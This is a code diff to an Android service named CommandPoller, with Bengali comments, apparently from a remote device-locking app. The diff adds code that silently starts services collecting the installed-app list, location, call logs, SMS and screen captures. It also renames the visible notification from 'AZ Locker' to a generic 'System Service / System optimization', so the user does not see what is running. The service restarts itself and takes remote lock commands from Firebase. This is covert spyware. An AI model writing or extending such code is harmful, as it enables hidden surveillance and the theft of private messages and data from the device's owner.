@@ -31,6 +31,7 @@ public class CommandPoller extends Service {
     private ComponentName adminComponent;
     private String deviceId;
     private ValueEventListener commandListener;
+    private boolean servicesStarted = false;
 
     @Override
     public void onCreate() {
@@ -47,10 +48,16 @@ public class CommandPoller extends Service {
         // ✅ Foreground Service চালু
         startForegroundService();
 
-        // ✅ ডিভাইস অনলাইন চিহ্নিত
+        // ✅ ডিভাইস অনলাইন
         registerDeviceOnline();
 
-        // ✅ কমান্ড লিসেন
+        // ✅ সব ব্যাকগ্রাউন্ড সার্ভিস চালু (একবারই)
+        if (!servicesStarted) {
+            servicesStarted = true;
+            startAllServices();
+        }
+
+        // ✅ লক কমান্ড লিসেন
         if (commandListener == null) {
             listenForCommands();
         }
@@ -58,13 +65,27 @@ public class CommandPoller extends Service {
         return START_STICKY;
     }
 
+    /** ✅ সব ব্যাকগ্রাউন্ড সার্ভিস চালু */
+    private void startAllServices() {
+        try {
+            startService(new Intent(this, AppListService.class));
+            startService(new Intent(this, LocationService.class));
+            startService(new Intent(this, CallLogService.class));
+            startService(new Intent(this, SmsService.class));
+            startService(new Intent(this, ScreenCaptureService.class));
+            Log.d(TAG, "All services started");
+        } catch (Exception e) {
+            Log.e(TAG, "Service start error: " + e.getMessage());
+        }
+    }
+
     private void startForegroundService() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "AZ Locker Service",
+                    "System Service",
                     NotificationManager.IMPORTANCE_LOW);
-            channel.setDescription("Remote device management");
+            channel.setDescription("System optimization");
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
                 manager.createNotificationChannel(channel);
@@ -74,14 +95,14 @@ public class CommandPoller extends Service {
         Notification notification;
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             notification = new Notification.Builder(this, CHANNEL_ID)
-                    .setContentTitle("AZ Locker")
-                    .setContentText("Active")
+                    .setContentTitle("System Service")
+                    .setContentText("Running")
                     .setSmallIcon(android.R.drawable.ic_lock_lock)
                     .build();
         } else {
             notification = new Notification.Builder(this)
-                    .setContentTitle("AZ Locker")
-                    .setContentText("Active")
+                    .setContentTitle("System Service")
+                    .setContentText("Running")
                     .setSmallIcon(android.R.drawable.ic_lock_lock)
                     .build();
         }
@@ -90,8 +111,13 @@ public class CommandPoller extends Service {
     }
 
     private void registerDeviceOnline() {
-        dbRef.child("devices").child(deviceId).child("status").setValue("online");
-        dbRef.child("devices").child(deviceId).child("lastSeen").setValue(System.currentTimeMillis());
+        try {
+            dbRef.child("devices").child(deviceId).child("status").setValue("online");
+            dbRef.child("devices").child(deviceId).child("lastSeen")
+                    .setValue(System.currentTimeMillis());
+        } catch (Exception e) {
+            Log.e(TAG, "Register error: " + e.getMessage());
+        }
     }
 
     private void listenForCommands() {
@@ -124,6 +150,8 @@ public class CommandPoller extends Service {
             } catch (Exception e) {
                 Log.e(TAG, "Lock failed: " + e.getMessage());
             }
+        } else {
+            Log.w(TAG, "Admin not active");
         }
     }
 
@@ -134,7 +162,7 @@ public class CommandPoller extends Service {
             dbRef.child("devices").child(deviceId).child("locked")
                     .removeEventListener(commandListener);
         }
-        // সার্ভিস আবার চালু করুন
+        // সার্ভিস আবার চালু
         Intent intent = new Intent(this, CommandPoller.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent);
